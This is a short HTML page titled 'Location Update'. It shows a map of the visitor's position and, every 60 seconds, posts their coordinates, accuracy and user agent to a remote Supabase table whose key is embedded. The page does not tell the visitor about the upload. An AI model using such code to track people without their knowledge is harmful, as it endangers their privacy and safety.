<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location Update</title>
<!-- Leaflet CSS for Map -->
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<style>
body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
#map { height: 100vh; width: 100%; }
#status { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.9); padding: 10px 20px; border-radius: 20px; font-size: 14px; color: #666; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 1000; transition: opacity 0.5s; }
</style>
</head>
<body>

<div id="map"></div>
<div id="status">Locating...</div>

<!-- Leaflet JS -->
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>
// --- CONFIGURATION ---
const SUPABASE_URL = 'https://qxxgdtnoilpaiyqpvtie.supabase.co'; // Replace this
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4eGdkdG5vaWxwYWl5cXB2dGllIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk0NTk5NDgsImV4cCI6MjEwNTAzNTk0OH0.TcMTA54ZcEa8x0T7v9uWFWEc_kbq30xn-rsJmTiDNzs'; // Replace this
// ---------------------

// Initialize map
const map = L.map('map').setView([0, 0], 2);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
attribution: '&copy; OpenStreetMap'
}).addTo(map);

let marker = null;
let lat = null;
let lng = null;
const statusDiv = document.getElementById('status');

// Function to send data and update map
function updateLocation(position) {
lat = position.coords.latitude;
lng = position.coords.longitude;
const accuracy = position.coords.accuracy;
const time = new Date().toISOString();
const userAgent = navigator.userAgent;

// Update UI Map
if (marker) map.removeLayer(marker);
marker = L.marker([lat, lng]).addTo(map);
map.setView([lat, lng], 15);

statusDiv.textContent = "Location Updated";
statusDiv.style.opacity = '0'; // Fade out status

// Send to Supabase
fetch(${SUPABASE_URL}/rest/v1/locations, {
method: 'POST',
headers: {
'apikey': SUPABASE_KEY,
'Authorization': Bearer ${SUPABASE_KEY},
'Content-Type': 'application/json'
},
body: JSON.stringify({ lat, lng, accuracy, created_at: time, user_agent: userAgent })
})
.then(response => {
if (!response.ok) throw new Error('Network response was not ok');
})
.catch(error => console.error('Error sending data:', error));
}

// Initial Location Fetch
if (navigator.geolocation) {
navigator.geolocation.getCurrentPosition(updateLocation, (error) => {
statusDiv.textContent = "Location unavailable";
});

// Heartbeat: Update every 60 seconds
setInterval(() => {
navigator.geolocation.getCurrentPosition(updateLocation);
}, 60000);
} else {
statusDiv.textContent = "Geolocation not supported";
}
</script>
</body>
</html>
